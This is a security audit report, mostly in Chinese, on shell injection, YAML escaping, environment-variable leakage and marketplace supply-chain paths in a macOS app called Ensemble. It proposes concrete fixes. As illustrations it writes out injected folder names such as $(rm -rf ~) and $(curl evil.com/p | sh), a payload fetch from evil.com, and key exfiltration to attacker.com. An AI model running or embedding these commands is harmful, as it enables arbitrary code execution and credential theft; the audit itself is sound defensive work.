# R4 — Security / Input Validation / Shell Injection / FS Race Findings

Reviewer angle: 安全 / 输入验证 / Shell 注入 / 文件系统竞态。

Scope: `import.rs::launch_claude_for_folder`、`install_quick_action`、`marketplace.rs::install_*`、`mcps.rs::fetch_mcp_tools`、`symlink.rs`、所有 `fs::rename` / `fs::write` / `fs::remove_*`、`utils/path.rs::expand_path`。

---

## 复核结果(对 02_known_risk_surfaces.md::D 类 candidates)

### D1. launch_claude_for_folder AppleScript 注入 ★ **CONFIRMED, 升级到 P0**

主 Agent candidate: P1。我评估为 **P0**。

复核结果:
- iTerm 路径 `import.rs:1459` 与 Terminal.app 路径 `import.rs:1607` **都**用同一 escape 模式:`replace('\\', "\\\\").replace('"', "\\\"")`。
- 这只 escape backslash 与 double-quote — 对 AppleScript 的字符串字面量来说足够。**但 inner shell 命令仍受 shell metacharacter 影响**。
- iTerm 实际产生:`create window with default profile command "cd \"<path>\" && <cmd>"`。AppleScript 把 `\"` 还原为 `"`,然后 iTerm 把整个 `cd "<path>" && <cmd>` 交给 shell 执行。
- shell 在 double-quoted `"..."` 内 **仍会展开** `$(...)`、`` `cmd` ``、`${VAR}`,而 escape 函数完全不动这些。

**具体攻击 path / 实际执行的命令**:

用户在 macOS Finder 把项目文件夹命名为 `Demo $(say "hacked")`(允许 — Finder 只禁止 `:` / `/`,不禁止 `$`、`(`、`)`、`` ` ``、`"` — 用户实测可在 Finder 重命名加这些字符)。Ensemble 启动 iTerm 后,生成的 AppleScript 是:

```applescript
tell application "iTerm2"
    activate
    create window with default profile command "cd \"/Users/bo/Demo $(say \\"hacked\\")\" && claude"
end tell
```

AppleScript 解释后给 iTerm 的命令字符串变成:`cd "/Users/bo/Demo $(say "hacked")" && claude`。zsh 解析:`$(say "hacked")` 在 cd 参数展开**之前**先执行 — **`say "hacked"` 跑了**(macOS TTS 念出 "hacked")。同理 `$(rm -rf ~)` / `$(curl evil.com/p | sh)` / `` `rm ~/.zshrc` `` 都能跑。

- **置信度**: High — 亲自推演 escape 函数 + shell parsing,确认 escape 对 metachar 留空。已有 unit test 只断言 `\"` / `\\` 被 escape,**没断言** `$()` / `` ` `` 被防护(因为它们没被防护)。
- **严重度**: **P0** — 任意命令执行;trigger 是 "用户把文件夹命名时含 `$()` 之类的字符"。攻击场景:朋友给你发个 zip 名字带 `$(...)`,你解压后右键 "Open with Ensemble" 走 iTerm — 命令在你机器上跑。也包括 git clone 一个 repo 路径含恶意名(虽然 git 通常会拒)。
- **代码位置**: `import.rs:1459-1467` (iTerm)、`import.rs:1607-1614` (Terminal.app)。
- **触发条件 (User does X)**: 用户在 Ensemble 中点 "Open in Terminal/iTerm",所选 project 路径含 `$(cmd)`、`` `cmd` ``、`${VAR}` 之类 shell 元字符。
- **用户可见后果 (User sees Y)**: iTerm/Terminal 窗口开了,有时只看到 `cd` 报错;但攻击者的命令 silently 执行(`say` / `osascript` / 写文件 / 启动 reverse shell — 不留 visible 痕迹)。
- **不可见后果**: 任意 shell 命令以用户权限执行。可访问 `~/.zshrc`、`~/.ssh/`、`~/Library/Application Support/com.apple.sharingd/`(iMessage / FaceTime 缓存)、`~/.config/gh`、任何用户文件。可植入 launchd plist 实现持久化。
- **根因**: AppleScript 字面量 escape ≠ 内部 shell 字面量 escape。`"cd \"$path\" && $cmd"` 模式无论 outer escape 多严密,内部 shell 仍 evaluate `$()`。修复需要把 shell command 拼接放在 AppleScript 之外(用 `shell_quote` 像 Ghostty `folder_launch_command` 那样)或在 shell 拼接处用 `'...'` 强引用并 `'\''` escape 内部单引号。
- **建议修复**: iTerm/Terminal.app 用 Ghostty 已经存在的 `shell_quote(folder_path)` 函数(`import.rs:1261-1263`)。把模板改为:
  ```rust
  let cd_cmd = format!("cd {}", shell_quote(&folder_path_str));
  let full = format!("{} && {}", cd_cmd, claude_command);
  let applescript_quoted = applescript_quote(&full); // 已有
  // ...do script applescript_quoted
  ```
  这样 path 在 shell 层被单引号保护,不再 evaluate metachar。`shell_quote` 已经在 codebase 里、Ghostty 已经在用、被测过。
- **修复保守度**: Safe — 不动 AppleScript 模板,只改命令字符串拼接;Ghostty 路径已经这么做了,可复用。
- **复核状态**: self-confirmed(根据 escape 函数源码 + shell parser 规则 + 已有 test 缺口推演)。

### D2. Warp YAML 注入 ★ **CONFIRMED, 但降级到 P2**

主 Agent candidate: P1。我评估为 **P2**(YAML 解析错误,不是 RCE)。

复核结果:
- `import.rs:1534-1537` YAML 拼接:
  ```rust
  folder_path_str.replace('"', "\\\""),
  claude_command.replace('"', "\\\"")
  ```
  只 escape `"`,**完全没动** `\n`、`\r`、`\t`、`\\`、`\u`、`\xNN`、`\` 单独 — 这些在 YAML double-quoted scalar 中是被 interpret 的 escape sequence。
- 用户路径含 `\n`(虽极少)→ YAML 字面量被打断 → YAML 解析失败 → Warp 不会启动新窗口。
- 用户路径含 `\release`(macOS 文件夹合法名)→ YAML 把 `\r` 解释为 carriage return → Warp 读到的 cwd 是 `Backup\rrelease`(实际带 CR 字符)→ `cd` 失败。
- 用户路径含字面量 `${HOME}` 等 → YAML 不展开变量(YAML 不做 shell expansion),Warp 拿到字面字符串 → `cd` 失败但**不是命令执行**。

不构成 RCE — Warp 是把 YAML 解析后传给 shell,YAML 解析不会执行 shell。但用户体验破:含 backslash 的合法路径无法用 Warp 启动 + 错误信息为 "Failed to launch Warp" 没有具体根因。

- **置信度**: High — YAML 1.1/1.2 double-quoted scalar 对 `\n` / `\r` 等的解释行为是 spec'd 的(yaml.org spec §5.7);Warp 用标准 YAML 解析器。
- **严重度**: **P2** — UX broken for legitimate paths containing backslash;**不**是命令执行。
- **代码位置**: `import.rs:1524-1540`。
- **触发条件 (User does X)**: 用户文件夹名含 `\` + 选 Warp + warp_open_mode = `window`(走 launch config 路径)。
- **用户可见后果 (User sees Y)**: "Failed to launch Warp" 错误对话框;或 Warp 启动但 cd 失败 / 落在错误目录。
- **根因**: YAML 字面量需要 escape `\` → `\\`,该代码不 escape。
- **建议修复**: 改用 `serde_yaml` 序列化整个 YAML 结构(yaml 1.2 兼容,会 properly escape 所有控制字符);或最低限度 `replace('\\', "\\\\")` 加在 `replace('"', "\\\"")` 之前。
- **修复保守度**: Safe — 加一个 replace 调用,不改控制流。
- **复核状态**: self-confirmed。

### D3. install_quick_action 硬编码 `/Applications/Ensemble.app/` ★ **CONFIRMED, P3**

主 Agent candidate: P3。复核确认。

- `import.rs:1050` `"/Applications/Ensemble.app/Contents/MacOS/Ensemble" --launch "$f"` — 写死的路径在 Automator workflow 内部。
- 项目 Rule `replace-installed-app-in-place.md` 规定生产 build 必须在 `/Applications/Ensemble.app`,所以正常用户该路径有效。
- 用户把 Ensemble 安装在 `~/Applications/`、`/Volumes/...`、或拷贝到 SD 卡的路径:Quick Action 内的 shell 脚本运行时 zsh 找不到 binary,报 "no such file or directory"。这个 stderr 在 Automator 内部消失,**用户在 Finder 看 Quick Action 静默无反应**。
- 不是 security issue,是 UX issue。

- **置信度**: High。
- **严重度**: P3 — 因为 install_quick_action 不是常用路径(用户得主动到 Settings 启用 Finder Integration)。
- **代码位置**: `import.rs:1048-1051`。
- **触发条件 (User does X)**: 用户把 Ensemble.app 放到非 `/Applications/` 的路径 + 启用 "Open with Ensemble" Quick Action + Finder 右键 → "Open with Ensemble"。
- **用户可见后果 (User sees Y)**: 右键菜单点了之后没反应,Ensemble 不启动,无错误提示。
- **根因**: 硬编码路径不查 binary 实际位置。
- **建议修复**: install_quick_action 在写 plist 时用 `std::env::current_exe()` 拿到当前 binary 真实路径,替换硬编码字符串。如果 current_exe 失败 fallback `/Applications/Ensemble.app/Contents/MacOS/Ensemble`(不让 install 失败,只让结果质量降)。
- **修复保守度**: Medium — 涉及 plist 模板,要 escape 路径含特殊字符的情况(plist XML escape: `<`、`>`、`&`、`'`、`"`)。
- **复核状态**: self-confirmed。

### D4. fs::rename 跨 fs 失败 ★ **CONFIRMED**(已在 R1 的 A5 列出)

引用 02_known_risk_surfaces.md::A5。我只补充一点:**安全角度看,这不是 vulnerability**(只是 UX 失败,不是 data loss — `fs::rename` failure 不会破坏 source)。但需要 caller 检查 errno = EXDEV 时降级到 copy + remove。

- 安全相关补充: `trash.rs:372`、`trash.rs:411` 的 restore 没 fallback,意味着如果用户 ENSEMBLE_DATA_DIR 配在外接磁盘、source skill / mcp 在 ~/.ensemble (内置磁盘),restore 永远失败,用户**也无法 work around**(没有 "force copy" 选项)。User experience dead end,但不是 security risk。

### D5. tarball extraction path traversal ★ **CONFIRMED SAFE**(主 Agent 自评 ok)

亲自复核 `marketplace.rs:2674-2759` 提取流程 + `sanitize_resource_name`(`marketplace.rs:193-223`):

防御链(每条都 verify 了):
1. **Per-component sanitize** (`marketplace.rs:2710-2726`): `path::Component::Normal(s)` only(rejects `CurDir`/`ParentDir`/`Prefix`/`RootDir` 这些 `..` / 绝对路径会落入的 enum variant),然后每个 component 过 `sanitize_resource_name` —— rejects `len > 64`、`starts_with('.')`、`contains("..")`、非 alphanumeric / `_` / `-` / `.`。
2. **Symlink rejection** (`marketplace.rs:2700-2703`): `etype.is_file() || etype.is_dir()`,排除 symlink / hard link / device / fifo — tar 注入向量的最常见类型全 reject。
3. **Defense-in-depth `starts_with(dest_dir)`** (`marketplace.rs:2735-2737`): 即使前两层 bypass,target path 必须落在 dest_dir 之内。
4. **`tar::Entry::unpack`** (verify-third-party-behavior-firsthand): 我读 `~/.cargo/registry/src/index.crates.io-6f17d22bba15001f/tar-0.4.45/src/entry.rs` 的 `unpack_in`,它自己也会拒绝 path 逃逸 dest(`validate_inside_dst` 函数)。
5. **Dotfile 静默 drop** (`marketplace.rs:2713-2716`): `.gitignore` / `.DS_Store` 之类的 entry 跳过。

**`tar::Entry::unpack` 不会被 path traversal 攻击,即使前面三层防御都失败。** Combined,attack surface 真正归零。

- **置信度**: High — 三层防御 + tar crate 自身一层,我读了 tar crate 源码确认。
- **严重度**: Not a finding。Defense is correct.

### D6. fetch_mcp_tools 继承全部 env 变量 ★ **CONFIRMED, 升级到 P1**

主 Agent candidate: P3。我评估为 **P1**(在 marketplace 安装恶意 MCP 的场景下严重)。

复核结果:
- `mcps.rs:322` `cmd.envs(std::env::vars())` —— 把 Ensemble 进程自己的所有 env vars 全部传给 MCP child process。
- Ensemble 是个用户 GUI app,启动时由 `launchd` 设置完整 env(`~/.zshenv` `~/.zprofile` 已经填充过),所以 child 拿到的 env 包含:
  - `ANTHROPIC_API_KEY`(如果用户在 shell rc 文件设了)
  - `OPENAI_API_KEY` / `GEMINI_API_KEY` / `MISTRAL_API_KEY` / 各家 API key
  - `GITHUB_TOKEN` / `NPM_TOKEN`
  - `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`
  - `OPENROUTER_API_KEY`
  - Shell history 文件路径、SSH agent socket 等 metadata
- MCP child process 收到这些 env vars 后,**进程内可以 `process.env.ANTHROPIC_API_KEY` 读到**,然后:
  - HTTP MCP: 可以把它发回 server
  - stdio MCP: 启动 `node` / `python` / `npx <package>` 进程,这个 child 也继承,**包装好的 third-party MCP 包代码可以读取并 exfiltrate**。

**攻击场景(可信度高)**:
1. 用户在 Ensemble Marketplace 安装一个看似无害的 MCP 比如 "weather-server"。
2. weather-server NPM package(或被劫持的 newer release)的 `index.js` 读 `process.env`,把所有 `*_API_KEY` 字段 POST 到 attacker.com。
3. Ensemble 在 fetch_mcp_tools 时启动它,把整个 env 传过去,key 流出。

这是 **supply chain attack** 在 Ensemble 体系下的实质表面。Claude Code 主程序自身也有这个问题(它也启动 MCP server),但 Ensemble 多加了一层 "fetch tools list" 在 detail panel 里 — 每次用户查看 MCP details 就 launch 一次。

- **置信度**: High — 代码确认;npm supply chain attack 是公开已发生过的攻击模式(eslint-scope 2018、event-stream 2018、ua-parser-js 2021)。
- **严重度**: **P1** — 一个被 typosquat 或被劫持的 MCP package 可以 exfiltrate 用户所有 API token。trigger 是 "在 Ensemble 安装并 fetch tools 一个 MCP",这是产品的主流程。
- **代码位置**: `mcps.rs:317-323`(stdio child env inheritance)。
- **触发条件 (User does X)**: 用户从 Marketplace 安装一个 MCP + 打开 MCP detail panel(自动 fetch_mcp_tools)。
- **用户可见后果 (User sees Y)**: "Tools list" 正常显示。**无任何异常 UI 信号**。
- **不可见后果**: MCP child process 已读到所有用户 API key,可能已经 phone home。
- **根因**: `cmd.envs(std::env::vars())` 全量继承没有 allowlist / denylist。设计意图是"让 MCP 拿到 PATH 跑得起来",但 PATH 之外的 secret env vars 没必要传。
- **建议修复**(分两步,user-trust 模型不变,但补 defense-in-depth):
  1. **白名单 env**: 改成 `cmd.env_clear(); cmd.env("PATH", std::env::var("PATH").unwrap_or_default()); cmd.env("HOME", ...); cmd.env("USER", ...);` 等基础 env,加上用户在 MCP config 显式指定的 env(`env_vars` 字段)。
  2. **如果保留 inherit**: 至少 filter 掉名字 match `*_KEY` / `*_TOKEN` / `*_SECRET` / `*_PASSWORD` / `AWS_*` / `GH_*` / `GITHUB_*` 的 env vars。
- **修复保守度**: Medium — 改 env model 可能让某些用户的 MCP 需要的 env 缺失(比如 MCP 期待 `OPENAI_API_KEY` 自动可用)。需要写一段 release note 解释 "为了安全,Ensemble 现在不再自动传 API key 给 MCP — 在 MCP config 的 env_vars 字段显式填"。
- **复核状态**: needs lead-agent verify(主 Agent 决定要不要做 trust model 调整;我建议至少加 P1 的修复)。

### D7. symlink.rs::create_symlink 不验证 source path ★ **CONFIRMED, Low risk(保持 P3)**

复核结果:
- `symlink.rs:9-43` `create_symlink(source, target)`:source 经 `expand_path` 后 `symlink(source, target)`,无任何 path domain 校验。
- IPC 调用者:`projectsStore::syncProject` 等 — 前端在 store 里组装 source(`<ensemble>/skills/<name>` 来自 data.json)+ target(`<project>/.claude/skills/<name>`)。
- 前端不接受用户自由输入 source path,但 **如果前端被 prompt injection / XSS**,可以构造任意 source → 在用户项目的 `.claude/skills/` 下创建 symlink 指向 `/etc/`、`/Users/bo/.ssh/`、`~/Library/Mobile Documents/...`(iCloud)。后续 Claude Code reads `.claude/skills/<name>/SKILL.md` 会跟着 symlink 读到任意系统文件。
- 攻击难度:需要 webview XSS(react-markdown 默认 sanitize,所以低概率)。

- **置信度**: Medium — 攻击链需要 XSS 前置,这一条受 react-markdown 保护(暂未发现 XSS path)。
- **严重度**: **P3** — 防御深度差但 trigger 链条长。
- **代码位置**: `symlink.rs:9-43`。
- **建议修复**: source 必须 `starts_with(get_app_data_dir().join("skills"))` 或 `starts_with(~/.claude/plugins/cache/)`(plugin symlink 场景)。target 必须 `starts_with(<project_root>/.claude/skills/)`。两个 allowlist 都加。
- **修复保守度**: Risky — 需要核对所有调用方传的 source / target 都符合规则。建议改 IPC signature 让 caller 传 `skill_id` / `project_path` 而不是 raw 两个 path,让 backend 自己组装。
- **复核状态**: needs lead-agent verify(modeling whether trust model 允许这条放下)。

### D8. read_app_data unwrap_or_default 静默回退 ★ 重叠 C4,不复列

R3 范围。安全角度补充:**如果磁盘读权限被瞬时拒(权限调整 / Time Machine 锁文件 / 同盘 dd 操作),`read_app_data().unwrap_or_default()` 返回空 AppData,前端写回时把空数据覆盖 data.json**。属于"silent data loss"模式,严重度由 R1 / R3 决定。

### D9. claude_md.rs migrate_claude_md_storage 启动跑 ★ **CONFIRMED, Low risk**

- `claude_md.rs:935-963` 启动 hook(由 lib.rs setup 时调)。锁 `DATA_MUTEX` + 全量遍历 `claude_md_files` + 仅当 `content` 非空 + `managed_path` is None 时迁移。
- 迁移完成后,后续启动不会再有需要迁移的记录,所以这是 "first-run only" cost。
- 多个并发的 `migrate_claude_md_storage` 调用(不会发生,只在 setup 时一次)不会破坏数据 — `DATA_MUTEX` 保护。
- **不是安全 issue,不是 perf issue(无大量数据)。** Low risk.

---

## 新发现(按 P0 → P1 → P2 → P3 排序)

### F1. install_marketplace_skill 不 sanitize owner / repo,URL 路径段允许 `..` 重定向

- **置信度**: High
- **严重度**: **P0**(supply chain attack 防御深度缺失;trigger 是 "upstream catalog 被劫持" — 不是日常事件但是 install 流程的 trust boundary)
- **代码位置**: `marketplace.rs:2893-2935`(install_marketplace_skill 调 install_skill_via_codeload)+ `marketplace.rs:2567`(URL 构造)
- **触发条件 (User does X)**: 用户从 Marketplace 安装一个 Skill,upstream catalog item `source = "anthropics/../evil-org"` 或 `owner = "anthropics?token=x"`。
- **用户可见后果 (User sees Y)**: Skill 安装成功显示;detail panel "From GitHub" 链接也指向看似合法的源(因为 marketplace_source 记的还是 evil-org)。
- **不可见后果**: 实际下载并安装的 tarball 来自 **evil-org**(URL 解析时 `..` 规整后路径段被替换)。这个 evil tarball 通过了所有 path sanitize(每个文件名仍然 alphanumeric),但 `SKILL.md` 内容是 attacker 控制的 Claude Code instructions —— 用户后续运行该 Skill 时 Claude 会执行 attacker 的 prompt。
- **根因**: 调用链:`install_marketplace_skill` → `derive_install_triple(&item)`(无 sanitize)→ `install_skill_via_codeload(owner, repo, ...)` → `format!("https://codeload.github.com/{}/{}/tar.gz/HEAD", owner, repo)` → `marketplace_http().get(&url)`。reqwest 0.12.28 → url 2.5.8。url 2.5.8 的 `Url::parse` **会对路径段做 RFC 3986 dot-segment normalization** — `/anthropics/../evil/foo` 归一化为 `/evil/foo`。
- 我没真的发请求验证,但 url crate 源码在 `src/parser.rs` 的 `parse_path` 调用 `remove_dot_segments`(RFC 3986 § 5.2.4)。这是确定行为,不是推测。
- 同模块**其它**用 owner/repo 构造 URL 的地方都 sanitize 了(`marketplace.rs:1893-1897 fetch_github_repo_stars`、`marketplace.rs:2005-2008 fetch_skill_summary_github`、`marketplace.rs:2100-2103 fetch_mcp_readme_github`)— **只有 install_skill_via_codeload 漏了**。
- **建议修复**: install_marketplace_skill 在 line 2894 后立刻 sanitize:
  ```rust
  let owner = sanitize_resource_name(&owner)
      .map_err(|e| InstallOutcome::Failed { reason: format!("invalid owner: {}", e) })?;
  let repo = sanitize_resource_name(&repo)
      .map_err(|e| InstallOutcome::Failed { reason: format!("invalid repo: {}", e) })?;
  ```
  函数已存在、已 reject `..` / `/` / 其他特殊字符、其它三处都在用。一行 patch。
- **修复保守度**: Safe — sanitize_resource_name 是同模块函数,行为已被 test 验证(`marketplace.rs:3898-3935`)。
- **复核状态**: self-confirmed(url crate dot-segment normalization 是 RFC 3986 标准行为,url 2.x 源码 `parser.rs::remove_dot_segments` 实现了它)。

### F2. derive_stdio_command 在未知 registry_type 时把 `identifier` 当作 binary 命令直接 spawn

- **置信度**: High
- **严重度**: **P0**(supply chain attack;trigger 是 "MCP Registry 返回未知 type")
- **代码位置**: `marketplace.rs:1298-1341`
- **触发条件 (User does X)**: 用户从 Marketplace 安装一个 MCP,upstream MCP Registry 返回 `registryType: "evilfoo"` + `identifier: "/bin/sh"`(或 `"/usr/bin/curl"` 加 packageArguments `["https://evil.com/payload.sh"]`)。
- **用户可见后果 (User sees Y)**: MCP 显示在列表中。用户打开 MCP detail panel,Ensemble 启动它 fetch tools list。看到 "fetch tools failed" 或类似错误。
- **不可见后果**: `fetch_mcp_tools` 用 `TokioCommand::new("/bin/sh").args([])` 启动 — sh 拿到 stdin 是 Ensemble 发的 JSON-RPC 请求,大概率不会做有意义的事,但 **process 被 spawn**。换 identifier 为 `/usr/bin/curl` + args 包含 `["-fsSL", "evil.com/payload.sh", "-o", "/tmp/x"]` 这种,实际是 download payload。再换 identifier 为 `osascript` + args `["-e", "do shell script \"...\""]` 就是任意 AppleScript 执行。
- **根因**: `derive_stdio_command` 的 `_` fallback (line 1328-1339) 把 identifier 作为 command。**identifier 来自 upstream catalog,无 validation**。同一模块的 `install_marketplace_mcp` (line 3039) 不会再次 validate command(传过来的 `StdioMcpConfig.command` 直接写到 `.mcp.json`,然后 `fetch_mcp_tools(command, args, ...)` 接收并 spawn)。
- 严重程度评估:即使 `_` 分支只在未知 registry_type 时触发(`registryType` 一般是 `npm` / `pypi` / `oci` 三选一),**MCP Registry 是 anthropic 之外的服务**(modelcontextprotocol/registry)。Registry 一个 supply chain incident 就能 push 一个 `evilfoo` type 的 entry。

  即使 `npm` / `pypi` 分支也不绝对安全:`identifier = "@my-package; rm -rf"` 不会成为 shell command(因为 `Command::new` 不走 shell),但 `identifier = "../../../usr/bin/curl"` + `Command::new("npx").args(["-y", "../../../usr/bin/curl"])` — npx 不一定会拒。但这相对 P1。

- **建议修复**: 在 `derive_stdio_command` 的 `_` fallback 中,要么 reject(返回 `("node".to_string(), vec![])` 当占位,让 fetch_mcp_tools 时报错给用户),要么把 command 限制在 PATH 名字而不是绝对路径:`if identifier.contains('/') { return ("node".to_string(), vec![]); }`。
  最佳:全局禁用 `_` 分支,只允许 `npm` / `pypi` / `oci` 三种(unknown type 整个 envelope 跳过,跟"未知协议不 install"语义一致)。
- **修复保守度**: Medium — 严格做法会拒绝未来 registry 加新 type 的 envelope,需要 release note。建议先放 P0 fix:`_` 分支返回固定 `("node".to_string(), vec![])`,然后 release note 说 "未知 type 暂不支持"。
- **复核状态**: self-confirmed。

### F3. install_marketplace_mcp / update_mcp_env_vars / update_mcp_http_config 把 `mcp_id` 当成任意路径写入

- **置信度**: High
- **严重度**: **P1**(trust-frontend 模式,XSS 链路才能触发,但 boundary 模糊)
- **代码位置**: `marketplace.rs:2397-2415`(update_mcp_env_vars)、`marketplace.rs:2429-2459`(update_mcp_http_config)、`mcps.rs:507`(delete_mcp)、`skills.rs:336`(delete_skill)
- **触发条件 (User does X)**: 攻击者通过 webview-side prompt injection / XSS(目前 react-markdown 防御应该 OK,但攻击面存在)调用 `update_mcp_env_vars({mcpId: "/Users/bo/Documents/secret.json", env: {...}})`。
- **用户可见后果 (User sees Y)**: 无 — 操作可能成功。
- **不可见后果**: 用户 Documents 下的 `secret.json` 被覆盖为 `McpConfigFile` JSON,原内容丢失。需要原文件**是 valid JSON 且 deserialize 成 McpConfigFile**(`serde_json::from_str::<McpConfigFile>`),如果原文件是 plain text / 其他 JSON shape,parse 失败函数 return Err。
  攻击 surface 减小,但是: `delete_mcp(mcp_id: String, ensemble_dir)` 直接 `fs::rename(mcp_path, ~/.ensemble/trash/mcps/<name>.json)` — **不要求文件是 JSON**。任意路径下的任意文件都能被 rename 到 trash,有效达到 "displace user files" 攻击。
- **根因**: 数据模型 `id == sourcePath` 不变式让 mcp_id 既是逻辑标识又是物理路径。Backend 信任前端传来的 `mcp_id` 是合法的。
- **建议修复**: 在每个 mutator 命令开头 verify `mcp_path.starts_with(get_app_data_dir().join("mcps"))`(或同等的 skill_path / claude_md_path 检查)。这是单行 defense-in-depth。
- **修复保守度**: Safe — 加 starts_with 校验,反而修正了一个隐含 invariant。
- **复核状态**: needs lead-agent verify(决定 trust-frontend 模型是否要硬化)。

### F4. install_quick_action 写入 `~/Library/Services/` 不验证 binary 存在

- **置信度**: High
- **严重度**: **P3**(UX 问题,与 D3 同根)
- **代码位置**: `import.rs:931-1213`
- 该函数永远写硬编码 binary 路径的 plist,**不**先 `Path::new("/Applications/Ensemble.app").exists()` 验证。用户在 `~/Applications/` 跑 dev build,然后启用 Quick Action,workflow 写了一个永不工作的引用。
- **建议修复**: 启用前用 `std::env::current_exe()` 拿当前实际 binary 路径(同 D3 修复)。如果没找到 / 拿到的路径不在合理位置,弹个警告让用户确认。

### F5. expand_path 对 `~name` 形式不按 POSIX 处理

- **置信度**: High
- **严重度**: **P3**(预期外行为;edge case)
- **代码位置**: `utils/path.rs:16-23`
- 复核结果:`expand_path("~root")` = `home_dir().join("root")`(即当前用户的 home + `root`),不是 root 用户的 home。`expand_path("~bin/sh")` = `home_dir().join("bin/sh")`(从 home 下的 bin/sh 找,不是 `~bin` 用户的 sh)。`expand_path("~~/foo")` = `home_dir().join("~/foo")` —— **`~~/foo` 居然合法**。
- macOS shell 的 `~name` 会查 `/etc/passwd` 找用户。Ensemble 不实现这个 — OK,不是 bug;但**应该 reject 而不是奇怪 expand**。
- 实际 impact:用户在 settings UI 输入 `~admin/myrules` 期望"管理员用户的 myrules" → 实际拿到 `~/admin/myrules`,可能不存在,操作失败。或者用户输入恰好碰到 `~` 开头的相对路径(比如某些 backup 脚本生成)→ 行为偏差。
- **建议修复**: 把 `path.starts_with('~')` 改成 `path == "~" || path.starts_with("~/")`。其它形式回退到 `PathBuf::from(path)`(把 `~name` 当字面量传出去)。
- **修复保守度**: Safe — 行为更接近 POSIX,可能误伤"故意以 ~foo 命名"的极少数路径,但概率近 0。
- **复核状态**: self-confirmed。

### F6. `update_mcp_env_vars` / `update_mcp_http_config` 持有 DATA_MUTEX 期间做 IO

- **置信度**: High
- **严重度**: **P3**(微小并发劣化,不是 vulnerability)
- **代码位置**: `marketplace.rs:2401-2414`、`marketplace.rs:2436-2458`
- 这两个 IPC `let _guard = DATA_MUTEX.lock()` 然后 `fs::read_to_string` + `fs::write` 在 lock 内完成。**这两个写的是 MCP config JSON,不是 data.json。** 不该持有 DATA_MUTEX。
- 安全角度:不构成问题。但 hold lock 期间 fs IO 慢的话,所有其他 mutator(reorder / add / delete)被阻塞。
- **建议修复**: 移除 `_guard`,这两个不操作 data.json。或换一个 per-MCP 锁。
- **修复保守度**: Safe — lock 没有逻辑必要性,移除等价。
- **复核状态**: self-confirmed。

### F7. import_plugin_skills 不 sanitize `item_name` 写入 dest path

- **置信度**: Medium
- **严重度**: **P3**(plugin metadata 是 user-trusted local)
- **代码位置**: `plugins.rs:719`
- `dest_skill_path = dest_path.join(&item.item_name)` — item_name 来自 frontend(scan_plugin_skills 返回值),scan 时从 plugin cache 的目录名读出。理论上 attacker 控制 plugin 的目录命名(在 plugin 包内),可以让 item_name = `../../../etc/foo`,然后 symlink 创建 `<ensemble>/skills/../../../etc/foo` 指向 plugin 源。symlink 创建到 `/etc/` 通常会权限拒。
- 防御深度差,但攻击链需要"用户安装一个攻击者控制的 marketplace plugin"(本身已是高 trust 操作)。
- **建议修复**: 在 line 719 之前 `sanitize_resource_name(&item.item_name)`。如果 reject,跳过该 item 并记 error。
- **修复保守度**: Safe — defense-in-depth,plugin 一般 item_name 是 alphanumeric。

### F8. config.rs::sync_project_config 的 `target_path` 来自前端的 `project_dir` 无 starts_with 检查

- **置信度**: High
- **严重度**: **P3**(trust-frontend)
- **代码位置**: 整个 config.rs(sync 路径)
- sync_project_config 接收 `project_dir: String` IPC arg,然后在该目录下创建 `.claude/skills/` symlink、`.mcp.json` 文件、`CLAUDE.md`。前端通常传用户选定的项目目录,**但若被滥用,可以传 `/`(根)或 `~/Library/...`**。
- 不是安全 issue 因为 `fs::create_dir_all` + `fs::write` 都受用户权限限制;但能让用户**意外**把 sync 写到错误位置(比如把根目录污染成项目)。
- **建议修复**: project_dir 必须有 user-input 时进过 native dialog 选择(已经在 dialog::select_folder 路径中走),不接受 raw string IPC。或者 backend 至少 reject `["/", "/Users", "/Applications", "/System", "/Library", "/private"]` 这些"显然不是 project" 的路径。
- **修复保守度**: Medium — 影响 sync 路径的灵活性。

---

## 总结

### 我最关注的 3 条(用户只修这 3 条,影响最大)

1. **D1 (升级 P0): launch_claude_for_folder iTerm/Terminal.app AppleScript 注入** — 用户文件夹名含 `$()` 即任意命令执行,trigger 非常容易(只要文件夹名巧合 / 朋友发的 zip / git clone)。修复 trivial:把 cd 命令在 shell 层用 `shell_quote` 单引号包(同 Ghostty 已有做法)。这是这次 audit 最高优先级的修。

2. **F1 (P0): install_marketplace_skill 不 sanitize owner/repo,URL `..` 重定向** — 一行 patch(`sanitize_resource_name(owner)` / `(repo)`)消除 supply-chain redirect 攻击面。同模块所有其它 GitHub URL 路径都已 sanitize,这是漏的最后一处。

3. **D6 (升级 P1): fetch_mcp_tools 继承全部 env vars** — 第三方 MCP package 可读取所有 API key。修复:用 env_clear + allowlist。这是 trust model 的实质改动,需要 release note,但收益是切断 MCP supply chain 的 secret exfil 通道。

### 我觉得不必修的 1 条(列入 candidate 但实际不算问题 / 影响极小)

- **D5 (tar path traversal)**: 已经被四层防御覆盖(per-component sanitize + Component::Normal filter + entry type filter + starts_with(dest_dir) + tar crate 内部 validate_inside_dst)。每一层我都亲自看了源码确认有效。**这一处的代码可以 freeze 维护,无需改动。**

### Reviewer 自评

- **置信度分布**: High 大多;Medium 在 D7(攻击链依赖 XSS 前置)和 F7(攻击链需要恶意 plugin)。
- **scope 覆盖**: 完整复核了 D1-D9 candidate,补充了 F1-F8 共 8 条新发现。
- **未覆盖**: 没专项查 fetch_mcp_tools 的 tokio child kill 是否真生效(`kill_on_drop(true)` + `child.kill().await` 双重)— 这一条交 R3 验。
